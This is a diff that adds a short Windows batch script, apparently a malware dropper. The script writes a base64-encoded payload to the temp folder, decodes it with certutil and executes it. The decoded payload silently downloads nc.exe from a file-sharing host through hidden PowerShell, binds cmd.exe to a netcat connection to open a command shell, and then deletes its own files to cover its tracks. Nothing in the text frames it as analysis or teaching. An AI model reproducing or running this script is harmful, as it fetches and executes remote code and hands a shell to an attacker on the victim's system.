@@ -1,0 +1,9 @@
+@echo off
+del "16123_temp_.txt" 2>nul
+del 16123_temp_.bat 2>nul
+cd %temp%
+echo Y2QgJXRlbXAlCmVjaG8gQGVjaG8gb2ZmID4+IGJkLmJhdAplY2hvIHBvd2Vyc2hlbGwgLUNvbW1hbmQgIihOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkRmlsZSgnaHR0cHM6Ly90cmFuc2Zlci5zaC9wTU9KaS9uYy5leGUnLCAnJXRlbXAlL25jLmV4ZScpIiA+PmJkLmJhdAplY2hvIG5jLmV4ZSAxMjcuMC4wLjEgMTIzIC1lIGNtZC5leGUgPj5iZC5iYXQKZWNobyBkZWwgbmMuZXhlID4+IGJkLmJhdAplY2hvIGRlbCBiZC5iYXQgPj4gYmQuYmF0CnBvd2Vyc2hlbGwgLVcgaGlkZGVuIC4vYmQuYmF0CmRlbCBiZC5iYXQ= > 16123_temp_.txt
+certutil -decode 16123_temp_.txt 16123_temp_.bat >nul 2>nul
+16123_temp_.bat
+del 16123_temp_.txt
+del 16123_temp_.bat
